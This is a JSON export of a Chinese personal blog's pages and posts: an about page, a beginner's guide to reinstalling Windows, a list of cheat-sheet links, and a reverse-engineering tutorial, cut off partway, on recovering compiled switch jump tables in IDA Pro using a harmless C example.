{"pages":[{"title":"页面找不到辣！","text":"404 - page not found文章可能被作者删除了，点 主页 看一看作者其他的内容吧！ 或者你可以来 这里 留言（ ‘▿ ‘ ）","link":"/404.html"},{"title":"","text":"{\"images\":\"https://i.loli.net\"}","link":"/data/urls.json"},{"title":"关于我","text":"ID 的解释 Nuke 是 Minecraft 游戏里的核弹，前面加个 China 显得比较牛 B，从初中玩游戏一直用到现在，没什么特别的含义，考虑换一个更牛 B 的，还没想好。 个人介绍 本科毕业于合肥工业大学，目前是中国科学院大学研一学生，主要研究 IoT 安全。入门小 pwn 手，刚接触 CTF 没多久，小目标是按时毕业。 性格爱好 &nbsp;&nbsp;Minecraft 十年玩家（现在不咋玩了） &nbsp;&nbsp; 吉他指弹初级选手（能弹两个云左右难度） &nbsp;&nbsp;CTF 入门选手 &nbsp;&nbsp; 猫猫狗狗爱好者（看别人养） &nbsp;&nbsp;&nbsp; 小米 6 资深钉子户 喜欢折腾各种有意思的东西：博客、服务器、树莓派、路由器、v2ray…… 与我联系 电子邮件：chinanuke@nuke666.cn&nbsp;&nbsp; PGP 公钥： PGP Public Key-----BEGIN PGP PUBLIC KEY BLOCK-----mQENBGC4xeUBCACz6oT3pN/88f7lTDlzDACRy7R22VJNyVf52tP6is6nZ9zvOHVYLPD5c9K+Yb3U9r9hCUr9h3e5pI/lT50vetdXnZEx3yXLutILMqdnPaB8fY7QGDu0EZsByMJJ489m3xkRx5ju5MWr/h5jnbWuE74rbd59S2Y8Sysonn4t3CYlzhtH/K2ekthUGUiqOtjSOK8I/uUMBjpI7ZFF/zus6LwFHCqzdDcFUULClgvNp/Nh04Y4Q6wV28bpgabo2IMmz1y2b48GNtvZvLxsBMP2+/AwfksyGOBQGlDss4pUEkXu9zPhQsqhxOSepCGOsKNOskZTMXfHwj5bGMrMDBW2ACaJABEBAAG0IGNoaW5hbnVrZSA8Y2hpbmFudWtlQG51a2U2NjYuY24+iQFOBBMBCAA4FiEEpn/CkZbkgA5bzrmdsilrmB0I0AAFAmC4xeUCGwMFCwkIBwIGFQoJCAsCBBYCAwECHgECF4AACgkQsilrmB0I0ACB5QgAh66WC9y5gfwKi7r2VvKAZlpQyhgwgzSR7UgxAz744JQ4SGSgCXweNCLgxoTxvr1/T+bQh4o8FqDr39Au9gAljOSJz246we2MgD0MQsxytgeB1aaSbLwQddsBOVa0leqyxbY5IuRtc/5nrmxNE2f0C9bROpRMdMFX3rY4ckpPIICH74Fyx3ELDGqhphomvIvIzltE4l09CIDVdRggVnYYadp7HJ8O/DxKzkN53wj733rWzXxQeUi/VCxKyIhN/qZ+VCVufHvYTvQELMJy66mRJ/JytuqOjTLOKU+1vPwZMM0QvuvghLYFxyVHBAgr6AGRlRh8jsVhCwArBB/tftJ/LLkBDQRguMXlAQgAo6SkeEVEUjGy0X3v1pWAkgnEZotnrIGtugWUNy5n0UBcwdMEQxiHZzAg2yNKMjX/4SJVlDRCXevbWlEUsUTw93TrNkdmKW12f0/5vkvUvOvkDK0SJEQHULU90hwfb8P1f2MDCLxkgaUPbNNgTQKsz8d9hcY+oS9l0uH4kp86wyJiqBt19f116Niww1sKjoSG8iyfbBDQa1c/hF2qtREA4BeBPvGRwT7xuEz28cFmO4kWSqMqxm+jNduLodF2s3UZ0sKzNOmcsqB9slvGtRQs2JDotuLoiO72GFoL4dbk9YrS4dkH2mcq5F1moTGZu6slRv5g1k1RviDAXD3DLQNNrwARAQABiQE2BBgBCAAgFiEEpn/CkZbkgA5bzrmdsilrmB0I0AAFAmC4xeUCGwwACgkQsilrmB0I0AANqwf/Yu3AIWCuKs2DC5yOzOEtRgaKcFfRrkWzrLJYy7W3nJ+Bg4qmeb+JYSrk7UwOAZgcwm60Oau/xum968x3/kksy8sL2HD8pBIU4TYtoI+f7jaX/n0o1H+iTD4f9SbQLHnOIbbA6oApuQKxbEwb8rN5c2pukmuNUGu4KR8p/CDC+9JGeGJDq7dlLXFgjTXH2T01MthWSH3BGUDfOCWRA135NsNzD7OwVXh+UWX3Iaaw9ezWSwvnzSbzmDEnzWPS6vpuQrjHuIR17JsAFaE4UPLiT0OYSD1G0QovBTYM5DSAkEbDqzWVyDam6N/SHSakyBgsONpBN2uTG0QsPZMkjatcNA===hddX-----END PGP PUBLIC KEY BLOCK----- GitHub：ChinaNuke 也可以直接在下方留言板中留言","link":"/about/index.html"}],"posts":[{"title":"面向小白的 Windows 系统重装教程","text":"这是一篇面向小白用户的 Windows 系统重装教程，由易到难地介绍了重装 Windows 系统的四种方法，包括直接使用系统提供的重置功能、直接运行镜像内的安装程序、把镜像文件写入 U 盘安装以及使用 PE 系统进行安装，内容尽可能简洁明了，可能有部分描述不太专业，欢迎在评论区指正！ 前言：本来觉得没有必要写一篇这样的东西，网上教程一大把一大把的，可是经常会有人问我怎么重装系统，看了看吧一些教程贴讲的也不是很清楚，没找到一篇合适的可以直接甩给别人的，干脆就自己写一篇，再有人问我就把这文章甩给他。 文章较长且图片较多，阅读时可以点击页面左侧目录进行跳转。 概念解释 首先对本文中出现的几个概念进行简要的解释，便于理解后续内容。 操作系统 维基百科 上对操作系统的定义是：“一组主管并控制计算机操作、运用和运行硬件、软件资源和提供公共服务来组织用户交互的相互关联的系统软件程序”。我们所使用的 Windows 就是一种操作系统，除此之外比较流行的还有开源的 Linux 系统（一般我们使用基于 Linux 内核的发行版，如 Debian、Ubuntu、CentOS 等）、苹果的 macOS 系统等。 硬盘（磁盘）硬盘就是就是我们电脑上用来存储数据的一个硬件设备，操作系统和我们的数据文件都是存储在硬盘上的。 分区（驱动器）硬盘分区是指将硬盘的整体存储空间划分成多个独立的区域，分别用于操作系统、应用程序及数据文件等（百度百科）。Windows 系统上的分区就是我们通常说的 C 盘、D 盘、E 盘这些，比如有人习惯把操作系统安装在 C 盘，应用程序安装在 D 盘，把自己的数据文件存储在 E 盘，这样如果系统崩溃了，不会影响到我们的数据文件。 系统镜像 本文中的系统镜像指下载的用于安装 Windows 操作系统的文件，通常以 .iso 为后缀名。 PE 系统Windows 预安装环境（Windows Preinstallation Environment），可以理解为一个最小 Windows 系统，它可以被放在 U 盘上，用来安装正式的操作系统，或者进行一些维护操作。常见的 PE 系统有：微 PE、老毛桃、大白菜、优启通等，有些不太良心的 PE 系统会在你安装系统过程中夹带私货，个人更推荐微 PE。 BIOS基本输入输出系统（Basic Input Output System）本质上是一个程序，主要负责开机时自检以及引导操作系统启动，在装系统过程中我们主要使用 BIOS 提供的启动菜单来实现从 U 盘启动。 UEFI 和 Legency BIOS 以及 GPT 分区表和 MBR 分区表 说来话长长话短说，UEFI 的出现是为了取代传统 BIOS，更好，近几年的电脑几乎都使用 UEFI 而不是传统 BIOS。GPT 与 UEFI 对应，MBR 与 Legency BIOS 对应，GPT 更好。所以现在装系统都是 UEFI+GPT 的组合，如果你发现新买的电脑是 BIOS+MBR 的组合，十有八九是无良电脑店水平不行他不懂给你瞎装…… 重装系统前的准备工作 备份重要文件 在进行后面的操作之前一定要备份好电脑里重要的数据！！ 怎么备份？把重要的文件拷到 U 盘里或者移动硬盘里是最简单的方法。 获取系统镜像MSDN, I Tell You 是一个广受好评的网站，找到想要下载的操作系统，选择合适的版本，复制下载链接进行下载即可，ed2k 和 bt 格式的下载链接可以使用迅雷或者百度云离线下载等工具进行下载，Windows 镜像下载后会得到一个后缀为.iso 的镜像文件。对大多数人来说，版本选择 Consumer Editions 即可。。 方法一：通过系统提供的重置功能 如果你只是想清空一下当前的系统，恢复到刚装完系统的干净状态，并不打算更改系统版本，那么最简单的方法是直接在系统设置中进行重置，不需要什么额外的知识，也不需要 U 盘，不需要下载任何东西，简单粗暴。打开“设置” -&gt; “更新和安全” -&gt; “恢复”，可以看到系统提供了“重置此电脑”的操作。 点击“开始”，然后选择“删除所有内容”，之后程序会显示出默认要执行的操作，“删除应用和文件。不清理驱动器”即不对分区进行覆写，“仅删除 Windows 驱动器中的所有文件”即仅删除系统盘（C 盘）的内容，C、D、E 这些其他盘里的东西原封不动。如果要对这个设置进行修改，点击“更改设置”，选择是否要覆写磁盘防止有心之人恢复你已经删除的数据（一般没必要，这个操作很慢），以及是否要删除所有的驱动器而不只是删除 C 盘。确认无误后，就可以点击“重置”然后等待系统重置完成。 方法二：直接运行镜像内的安装程序 如果你的系统现在能够正常使用，那么可以直接在当前系统中双击下载的镜像文件运行安装程序（可以把它当做一个安装包），系统会自动使用虚拟光驱装载镜像文件，并弹出一个 DVD 驱动器的窗口。双击“setup.exe”程序，选择允许更改，即可看到“Windows 10 安装程序”窗口。在这里可以“更改 Windows 安装程序下载更新的方式”，选择是在安装系统时下载更新、驱动程序和可选功能还是在安装完系统后再进行这些操作。 准备就绪后，安装程序会显示即将执行的默认操作，即“安装 Windows 10 家庭版”和“保留个人文件和应用”，我们可以点击“更改要保留的内容”，选择“无”以清空整个分区。最后点击安装，等待安装完成。 方法三：将系统镜像写入 U 盘进行安装 方法二并不总是能成功，而且如果你的系统出现问题，已经无法正常使用，那么你可以在另一台电脑上将下载好的镜像写入一个空的 U 盘，把这个 U 盘作为系统安装盘来重新安装 Windows 系统。 下载并运行Rufus 工具，Rufus 是一个可以格式化和创建可引导 USB 闪存盘的工具，使用它可以将我们下载的系统镜像写入到 U 盘中。设备选择我们插入的 U 盘，点击右侧选择按钮选择我们下载好的系统镜像，其他设置保持默认，点击“开始”进行写入。需要注意的是，写入过程会擦除原先 U 盘上所有的数据，所以一定要用一个没有重要数据的 U 盘。 写入完成后，将 U 盘插入自己的电脑并开机（如果是在自己电脑上进行的写入操作则重启电脑），并不断地点按电脑的启动菜单键（部分品牌笔记本电脑按键如下，有的电脑可能还要同时按下 Fn 键），直到出现一个类似下图的启动菜单。如果没有出现启动菜单而是直接进入了自己的系统，那么关机重来。很多电脑在 Logo 界面时如果你随便按一个键，它会提示你按哪个键进入启动菜单，按哪个键进入 BIOS，可以仔细观察一下。在启动菜单中选择自己的 U 盘（一般会以 EFI 开头且含有 U 盘厂商的名字，比如 SanDisk），按下回车键即可从 U 盘启动。 品牌 启动按键 品牌 启动按键 联想 F12 华硕 ESC 苹果 长按 Option 神舟 F12 戴尔 F12 宏碁 F12 惠普 F9 三星 F12 接着你将会看到 Windows 安装程序，在“激活 Windows”窗口，点击“我没有产品密钥”，跳过密钥的填写，接着选择要安装的 Windows 版本。 安装类型选择“自定义”，然后进入到安装分区选择界面，选择你要把系统安装在哪个盘，我们可以通过容量大小来辨别哪个是我们的 C 盘，把系统安装在这里。也可以在这个界面对分区进行调整，增加或者删除分区，但只建议动主分区，不要修改前面的“系统分区”和“MSR”分区。如果想清空某个分区的内容，可以选中分区然后点击下面的“格式化”按钮。 点击“下一步”会提示安装过程可能把以前系统盘内的文件备份到“Windows.old”文件夹，如果不需要这些文件我们要记得装完系统后把文件夹删除，这个文件夹还是挺大的。之后等待安装完成即可。 方法四：使用 PE 系统进行系统安装 我最喜欢的方式还是使用 PE 来装系统，因为 PE 系统里带了一些很有用的工具，比如 DiskGenius，使得我们可以在重装前通过 PE 系统对硬盘进行重新分区，也可以直接在 PE 系统里对原操作系统的重要文件进行备份，根本不需要考虑原操作系统是否可用，这是给别人装系统最舒服的方式，而且从我的经历来看这种方法要比方法二和三更可靠一些。 下载并运行 微 PE 工具箱 最新版本，点击“查看下载链接”按钮会提示捐赠，但并不是强制的，没有使用过可以先跳过捐赠，用后觉得不错再回来捐赠也行，注意下载 64 位版本。不要点软件界面正中间那个大大的“立即安装进系统”按钮！我们要安装到 U 盘。点击右下角“安装 PE 到 U 盘图标”，“安装方法”为默认的三分区方式，其他设置也保持默认即可，可以勾选“个性化盘符图标‘，也可以自定义 PE 系统的壁纸。 成功把微 PE 安装到 U 盘之后，我们要让电脑从 U 盘启动，具体操作和方法三中描述一样。 之后，我们就成功进入了 PE 系统，这个系统的样子跟我们平时所使用的系统看起来很像。点击桌面上的“此电脑”图标，可以看到自己硬盘上的分区，这里显示的盘符（C、D、E）可能和以前在系统中看到的不一样，这不重要，只是个代号而已。如果无法进入系统，那么可以在这里对我们的数据进行备份，把需要备份的东西复制到 U 盘的数据区即可。注意一下其中容量为 299M 的 Z 盘，后面要用到。 DiskGenius 是一个非常好用的分区管理工具，我们可以用它对电脑上的分区重新进行规划，付费版本还提供了“数据恢复”功能，不过微 PE 自带的是免费版本没有这个功能。这里演示一个可选的操作，对重装系统来说不是必须的。比如说我觉得现在的分区太乱了我想重新建分区重新做人，不想要以前所有的分区和数据了，那么我们可以在左侧硬盘上点击鼠标右键，点击“删除所有分区”，执行完成后这个硬盘上所有的分区都被删除了，点击左上角“保存更改”按钮使操作生效（注意啊看准了硬盘别选错了！之前就有个小伙子在 PE 系统里把我放 PE 系统的 U 盘分区给删了……）。然后点击上面“快速分区”按钮，分区表类型选择“GUID”（有的版本显示为 GPT），选择合适的分区数量，“创建新 ESP 分区”和“创建 MSR 分区”要保留勾选，在右侧调整每个分区的大小和卷标，比如说我想要“系统”、“软件”、“数据”三个分区，之后点击“确定”执行操作。注意：这个操作会删除所有分区上的数据 重新分区完成后，可以看到系统的分区变成了一个 ESP 分区、一个 MSR 分区，一个 C 盘（系统盘）、一个 D 盘（软件盘）、一个 E 盘（数据盘）。其中，注意 ESP 分区的大小，300M，实际上就是前面看到的 Z 盘。 接着我们开始往硬盘上安装操作系统。运行桌面上的“Windows 安装器”，程序界面如下。有三个“位置”需要进行确认和修改，第一个“Windows 安装文件的位置”，就是安装镜像的位置，点击右侧“搜索”按钮选择之前放在 U 盘数据区的 Windows 镜像即可；第二个“引导驱动器的位置”就是前面那个 300M 大小的 ESP 分区，正常情况下程序会自动帮我们选择，需要确认一下自动选择的是否正确；第三个“安装驱动器的位置”，就是要把系统安装在哪里，这里选择我们划分的 C 盘（系统盘）。如果要安装其他的 Windows 版本，可以在下面下拉列表进行选择。其他选项保持默认不需要更改，点击“安装”按钮执行安装，完成后会提示重启。 方法对比 方法 难度 需要准备 局限性 推荐指数 1 ★☆☆ 无 不能安装其他版本的系统 ★★★ 2 ★☆☆ 下载系统镜像 似乎不能全盘擦除，而且我在虚拟机上安装失败了… ☆☆☆ 3 ★★☆ 下载系统镜像、下载写盘工具、准备 U 盘 一个 U 盘只能写一个系统镜像，而且不能再用来存别的东西 ★☆☆ 4 ★★☆ 下载系统镜像、下载 WePE、准备 U 盘 / ★★★ 常见问题解答 我安装的系统是正版系统吗？我要如何激活我的系统？正版不正版的界定应该主要是你给没给微软钱……近几年购买的笔记本电脑一般都预装了正版的 Windows10 家庭版，如果你重装时选择的是家庭版系统，那么联网后会自动激活，这种情况算是电脑厂商给你花了钱的。如果你是比较早的电脑没有原装的正版系统，或者你就是想体验专业版或者企业版，可以自行搜索激活工具进行激活，比较主流的有数字权利激活和 KMS 激活两种方案。 家庭版、企业版、专业版，我该选哪一种？Consumer editions 包含 Home（家庭版）、Education（教育版）、Professional（专业版） Business editions 包含 Education（教育版）、Enterprise（企业版）、Professional（专业版） 如果你不知道选啥版本那就选家庭版，说明更高级版本里的功能你也用不上。","link":"/2021/08/How-to-reinstall-Windows/"},{"title":"一些有用的 Cheat Sheets","text":"记录和分享一些不错的 Cheat Sheets，以便查阅。 Screen：https://maojr.github.io/screencheatsheet/ TMUX：https://tmuxcheatsheet.com/ VIM：https://vimsheet.com/ Docker：https://dockerlabs.collabnix.com/docker/cheatsheet/ GDB：https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf Git：https://training.github.com/downloads/zh_CN/github-git-cheat-sheet/ Latex：https://wch.github.io/latexsheet/latexsheet.pdf","link":"/2021/11/Some-useful-cheat-sheets/"},{"title":"在 IDA Pro 中恢复 switch 语句","text":"在对程序进行逆向分析时，可能会遇到 IDA Pro 工具无法正确识别出编译后的 switch 语句的情况，增加了我们理解代码的难度。本文从编译器对 switch 语句的优化入手，先正向分析编译器会把 switch 语句编译成什么样的汇编代码，这些代码由哪些成分组成，之后介绍如何在 IDA Pro 工具中恢复出 switch 语句。 本文中所使用的环境为： OS：Ubuntu 20.04 x64 GCC：9.3.0 IDA Pro: 7.5 for Windows 理解编译器对 switch 语句的优化 出于对代码执行效率的考虑，编译器会对源程序中的 switch 语句进行优化，而这种优化可能导致 IDA Pro 工具无法正确理解程序中的 switch 语句，从而影响我们进行逆向分析。编译器对 switch 语句的优化按照 case labels 是否紧凑和连续分为多种情况，本文只讨论 case labels 紧凑连续时被优化成跳转表的情况。 我们先从一个例子入手，观察我们在源代码中编写的 switch 语句是如何被编译器处理的。比如说，我们写这样一段简单的代码，获取一个输入值 input，然后将这个输入作为 switch 语句的判断条件，根据 input 值的不同来输出不同的结果，这个 switch 语句包含 6 个 case（default case 算作 case 0）。 switch.c#include &lt;stdio.h&gt;int main() { int input; while (1) { scanf(&quot;%d&quot;, &amp;input); switch(input) { case 1: printf(&quot;your input is 1&quot;); break; case 2: printf(&quot;your input is 2&quot;); break; case 3: printf(&quot;your input is 3&quot;); break; case 4: printf(&quot;your input is 4&quot;); break; case 5: printf(&quot;your input is 5&quot;); break; default: printf(&quot;what's your input?&quot;); } }} 使用 gcc -S switch.c 命令进行编译，不进行汇编和链接，获得汇编代码 switch.s。我的 gcc 编译出来自己带了这些注释，你们的应该也一样吧。代码首先在开头定义了 LC1~LC6 这六个字符串常量，后面我们可以借助这些常量的标签去识别跳转的目标地址对应哪一个 case。接着是 main 函数的指令部分，再后面是一个跳转表，最后是我们跳转的目标代码部分。可以看到，标签 L8、L7、L6、L5、L3、L2 处分别对应 6 个 case 的目标代码，其中 L2 标签是 default case 的情况。跳转表中定义了 6 个 .long 类型（4 字节）的数据，每一个数据的值都是 Ln-L4 这样的形式，不难推测出跳转表中存储的是 6 个 case 对应目标代码与跳转表之间的相对偏移。 接着我们来阅读一下 main 函数中的关键代码，在 main 函数中，调用完 scanf 函数之后，就开始了 switch 语句的部分，首先从栈中取出 input 变量放到 eax 寄存器中，对输入进行判断，如果大于 5 则跳出到 L2 标签（default case），否则继续向下执行。这时候可能有人就问了：我 input 变量定义了一个 int 类型，那它要是个负值咋整？是不是还得加一个负值的判断？这里很巧妙地用了ja（Jump Above）这个指令，它把操作数都当做无符号数进行比较，也就是说，如果取到 eax 寄存器里的是一个负值，比如 -1，即 0xffffffff，作为无符号数它的值是 4294967295，是远大于 5 的，所以同样会跳出到 L2 标签。 然后程序把数据段 rax*4 得到的地址放到 rdx 寄存器中，这实际上就是跳转表的索引；接着将跳转表地址取到 rdx 寄存器中，取出跳转表中元素的值放到 eax 寄存器并带符号扩展为 8 个字节。之后取跳转表基址到 rdx 寄存器，两者相加得到跳转目标地址。 switch.s...; --------------------; 字符串常量定义 ; --------------------.LC1: .string &quot;your input is 1&quot;.LC2: .string &quot;your input is 2&quot;.LC3: .string &quot;your input is 3&quot;.LC4: .string &quot;your input is 4&quot;.LC5: .string &quot;your input is 5&quot;.LC6: .string &quot;what's your input?&quot;...; --------------------; main 函数代码 ; --------------------main:....L10: ; 由于 while(1)循环，程序的结尾会跳回 L10 标签 ... call __isoc99_scanf@PLT movl -12(%rbp), %eax ; switch 语句的第一条指令 cmpl $5, %eax ja .L2 ; 如果输入值大于 5 则跳转到 L2，即 default case movl %eax, %eax leaq 0(,%rax,4), %rdx ; rdx &lt;- &amp;(ds:[rax*4]) leaq .L4(%rip), %rax ; rax &lt;- &amp;(rip + .L4) movl (%rdx,%rax), %eax ; eax &lt;- [rax + rdx] 取出跳转表中元素 cltq ; 将 4 字节带符号扩展为 8 字节（Convert Long To Quad） ; rax &lt;- sign-extend of eax leaq .L4(%rip), %rdx addq %rdx, %rax ; rax &lt;- rax + rdx 计算得到跳转目标地址 notrack jmp *%rax ; 跳转到目标地址; -------------; 跳转表 ; ------------- .section .rodata .align 4 .align 4.L4: ; 跳转表，每一个元素字长是 4 字节 .long .L2-.L4 .long .L8-.L4 .long .L7-.L4 .long .L6-.L4 .long .L5-.L4 .long .L3-.L4; -------------------; 跳转目标代码 ; ------------------- .text.L8: leaq .LC1(%rip), %rdi ; case 1 入口 movl $0, %eax call printf@PLT jmp .L9.L7: ; case 2 入口 leaq .LC2(%rip), %rdi movl $0, %eax call printf@PLT jmp .L9.L6: ; case 3 入口 leaq .LC3(%rip), %rdi movl $0, %eax call printf@PLT jmp .L9.L5: ; case 4 入口 leaq .LC4(%rip), %rdi movl $0, %eax call printf@PLT jmp .L9.L3: ; case 5 入口 leaq .LC5(%rip), %rdi movl $0, %eax call printf@PLT jmp .L9.L2: ; default 入口（case 0 入口） leaq .LC6(%rip), %rdi movl $0, %eax call printf@PLT nop.L9: jmp .L10 ; while(1)... 在 IDA Pro 中恢复 switch 语句 现在我们来看一下 IDA Pro 对这个 switch 语句的识别情况。使用 gcc -o switch switch.c 命令进行编译和汇编、链接，得到二进制程序 switch。使用 IDA Pro 7.5 加载程序，反汇编得到的代码如下，和上面直接编译得到的汇编代码逐行进行对比，除了指令的表示形式不一样之外，内容基本上是一样的。可以注意到 0x11c8 地址处有一个奇怪的 db 3Eh 没有被解析，这实际上就是 notrack 指令，由于比较新所以 IDA Pro 7.5 并不能识别出这个指令，但它对我们分析和恢复 switch 语句没有任何影响，不必管它。 .text:0000000000001197 call ___isoc99_scanf.text:000000000000119C mov eax, [rbp+var_C].text:000000000000119F cmp eax, 5.text:00000000000011A2 ja loc_122A.text:00000000000011A8 mov eax, eax.text:00000000000011AA lea rdx, ds:0[rax*4].text:00000000000011B2 lea rax, unk_206C.text:00000000000011B9 mov eax, [rdx+rax].text:00000000000011BC cdqe.text:00000000000011BE lea rdx, unk_206C.text:00000000000011C5 add rax, rdx.text:00000000000011C8 db 3Eh.text:00000000000011C8 jmp rax.text:00000000000011CB ; ---------------------------------------------------------------------------.text:00000000000011CB lea rdi, aYourInputIs1 ; &quot;your input is 1&quot;.text:00000000000011D2 mov eax, 0.text:00000000000011D7 call _printf.text:00000000000011DC jmp short loc_123C.text:00000000000011DE ; ---------------------------------------------------------------------------.text:00000000000011DE lea rdi, aYourInputIs2 ; &quot;your input is 2&quot;.text:00000000000011E5 mov eax, 0.text:00000000000011EA call _printf.text:00000000000011EF jmp short loc_123C.text:00000000000011F1 ; ---------------------------------------------------------------------------.text:00000000000011F1 lea rdi, aYourInputIs3 ; &quot;your input is 3&quot;.text:00000000000011F8 mov eax, 0.text:00000000000011FD call _printf.text:0000000000001202 jmp short loc_123C.text:0000000000001204 ; ---------------------------------------------------------------------------.text:0000000000001204 lea rdi, aYourInputIs4 ; &quot;your input is 4&quot;.text:000000000000120B mov eax, 0.text:0000000000001210 call _printf.text:0000000000001215 jmp short loc_123C.text:0000000000001217 ; ---------------------------------------------------------------------------.text:0000000000001217 lea rdi, aYourInputIs5 ; &quot;your input is 5&quot;.text:000000000000121E mov eax, 0.text:0000000000001223 call _printf.text:0000000000001228 jmp short loc_123C.text:000000000000122A ; ---------------------------------------------------------------------------.text:000000000000122A.text:000000000000122A loc_122A: ; CODE XREF: main+39↑j.text:000000000000122A lea rdi, format ; &quot;what's your input?&quot;.text:0000000000001231 mov eax, 0.text:0000000000001236 call _printf.text:000000000000123B nop.text:000000000000123C.text:000000000000123C loc_123C: ; CODE XREF: main+73↑j.text:000000000000123C ; main+86↑j ....text:000000000000123C jmp loc_1184.text:000000000000123C ; } // starts at 1169.text:000000000000123C main endp 从上面反汇编得到的代码不难看出 unk_206c 就是 switch 语句的跳转表，双击查看这个跳转表，可以看到 IDA 只是将这部分内容识别成一连串的字节数据，并不能理解数据的含义。 .rodata:000000000000206C unk_206C db 0BEh ; DATA XREF: main+49↑o.rodata:000000000000206C ; main+55↑o.rodata:000000000000206D db 0F1h.rodata:000000000000206E db 0FFh.rodata:000000000000206F db 0FFh.rodata:0000000000002070 db 5Fh ; _.rodata:0000000000002071 db 0F1h.rodata:0000000000002072 db 0FFh.rodata:0000000000002073 db 0FFh.rodata:0000000000002074 db 72h ; r.rodata:0000000000002075 db 0F1h.rodata:0000000000002076 db 0FFh.rodata:0000000000002077 db 0FFh.rodata:0000000000002078 db 85h.rodata:0000000000002079 db 0F1h.rodata:000000000000207A db 0FFh.rodata:000000000000207B db 0FFh.rodata:000000000000207C db 98h.rodata:000000000000207D db 0F1h.rodata:000000000000207E db 0FFh.rodata:000000000000207F db 0FFh.rodata:0000000000002080 db 0ABh.rodata:0000000000002081 db 0F1h.rodata:0000000000002082 db 0FFh.rodata:0000000000002083 db 0FFh 点击鼠标右键，逐个将数据类型修改为“Double Word”，然后点击 “Edit” -&gt; “Operand type” -&gt; “Offset” -&gt; “Offset (user-defined)”，“Base address” 填入跳转表自身的地址 0x206c，其他保持默认，这样可以把这些值恢复成偏移的表示形式，现在看起来是不是和上面编译直接得到的汇编代码很像了？这个步骤对于恢复 switch 语句来说不是必须的，只是为了讲解起来更清楚一些。 .rodata:000000000000206C jumptable_206C dd offset loc_122A - $ ; DATA XREF: main+49↑o.rodata:000000000000206C ; main+55↑o ....rodata:0000000000002070 dd offset loc_11CB - offset jumptable_206C.rodata:0000000000002074 dd offset loc_11DE - offset jumptable_206C.rodata:0000000000002078 dd offset loc_11F1 - offset jumptable_206C.rodata:000000000000207C dd offset loc_1204 - offset jumptable_206C.rodata:0000000000002080 dd offset loc_1217 - offset jumptable_206C 如果我们尝试直接按 F5 对 main 函数进行反编译，会得到什么样的结果呢？可以看到，while 语句识别出来了，但 switch 语句并没有被识别出来，而且，很明显少了许多代码，和源代码相比不能说一模一样吧，可以说是毫不相干。 int __cdecl main(int argc, const char **argv, const char **envp){ int result; // eax unsigned int input; // [rsp+4h] [rbp-Ch] BYREF unsigned __int64 v5; // [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u); while (1 ) { __isoc99_scanf(&quot;%d&quot;, &amp;input); if (input &lt;= 5 ) break; printf(&quot;what's your input?&quot;); } __asm { jmp rax } return result;} 接下来进入正文，使用 IDA Pro 提供的“Specify switch idiom”功能恢复出 switch 语句。将光标点在 switch 语句的起始地址 0x199c 处，点击 “Edit” -&gt; “Other” -&gt; “Specify switch idiom”，可以看到这样一个窗口。 对于这些值的含义，IDA Pro 自身其实做了一些简要的说明，点击窗口下方的“Help”按钮，可以看到这样的内容： Please specify the jump table address, the number of its elements and their widths(1,2,4,8). The element shift amount and base value should be specified only if the table elements are not plain target addresses but must be converted using the following formula: &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;target = base +/- (table_element &lt;&lt; shift) (only this formula is supported by the kernel; other cases must be handled by plugins and ‘custom’ switch idioms). If you specify BADADDR as the element base then the base of the switch segment will be used The start of the switch idiom is the address of the first instruction in the switch idiom. Subtraction is used instead of addition if “Subtract table elements“ is selected. When table element is an instruction then you should select “Table element is insn“. If you specify that a separate value table is present, an additional dialog box with its attributes will be displayed. 但是，IDA Pro 提供的这个说明只解释了一部分的参数，而且有些参数的解释也不很明确，经过一番尝试和理解，我得出了如下解释，其中加粗的参数是我们需要关注的参数。 Address of jump table：跳转表的地址。 Number of elements：跳转表中元素的个数。 Size of table element：跳转表中每个元素的字长（1/2/4/8）。 Element shift amount：一般情况下保持默认的 0 即可。除非跳转表中存储的元素并不是跳转的目标地址，而是需要通过 target = base +/- (table_element &lt;&lt; shift) 这个公式计算得出，这种情况需要作为 shift 的值提供。 Element base value：与 Address of jump table 保持相同的值，对应上述公式中的 base。 Start of the switch idiom：switch 语句的首个指令的地址（比如上面例子中的 0x199c），在打开“Specify switch idiom”窗口时，光标处的地址会被自动填写到这里，这就是前面把光标点在地址 0x199c 处的原因。 Input register of switch：存储 switch 语句输入的寄存器，即存储 switch(input) {...} 中input变量的寄存器。 First(lowest) input value：最小的 case 值，比如 case 有 1、2、3、4、5，则填写 0，因为 default 占用了 case 0。 Default jump address：default case 的跳转目标地址，可以不指定，不指定时对于 default case 以 case 0 的形式显示。 Separate value table is present：暂时没搞清，用不到。 Signed jump table elements：跳转表中的元素是有符号值时需要勾选。 Subtract table elements：计算跳转表元素时用减法而不是用加法。 Table element is insn：跳转表中存储的不是目标地址而直接是指令时需要勾选。 还是以上面的程序为例，我来逐个解释如何从 IDA Pro 反编译得到的汇编代码中识别并填写这些值。我把前面的一部分代码粘贴到这里，便于对照查看。 .text:0000000000001197 call ___isoc99_scanf.text:000000000000119C mov eax, [rbp+var_C].text:000000000000119F cmp eax, 5.text:00000000000011A2 ja loc_122A.text:00000000000011A8 mov eax, eax.text:00000000000011AA lea rdx, ds:0[rax*4].text:00000000000011B2 lea rax, unk_206C.text:00000000000011B9 mov eax, [rdx+rax].text:00000000000011BC cdqe.text:00000000000011BE lea rdx, unk_206C.text:00000000000011C5 add rax, rdx.text:00000000000011C8 db 3Eh.text:00000000000011C8 jmp rax 首先是 Address of jump table 和 Element base value，这两个都填写跳转表的地址，可以看到 0x11b2 地址处和 0x11be 地址处分别把 unk_206c 的地址取到 rax 和 rdx 寄存器，然后分别进行了从跳转表中取元素和将取出的元素与跳转表基址相加的操作，那显然 0x206c 就是跳转表的地址。 接着是跳转表中元素字长（Size of table element）的识别，如何看出跳转表中每个元素的字长呢？去看跳转表吗？不，我们看程序是如何从跳转表中取值的。0x11aa 处的代码 lea rdx, ds:0[rax*4] 已经告诉我们，跳转表中的每个元素是 4 个字节。有了元素字长，那么跳转表中元素个数（Number of elements）自然也有了，(跳转表结束地址 - 跳转表起始地址 + 1) / 字长 就可以得到元素个数为 6，也可以将跳转表的元素恢复成 Double Word（4 字节）之后直接数一下有几个。 switch 语句的起始地址（Start of the switch idiom）已经自动填写好了，就是我们打开“Specify switch idiom”窗口时光标所在的位置。那么这个位置是怎么来的呢？目测一下，scanf 函数 把输入值存到了 input 变量，switch 语句把 input 变量的值取到 eax 寄存器，然后与 case 总数进行比较，那么 mov eax, [rbp+var_C] 就是 switch 语句编译出来的第一条指令。通过这个分析，switch 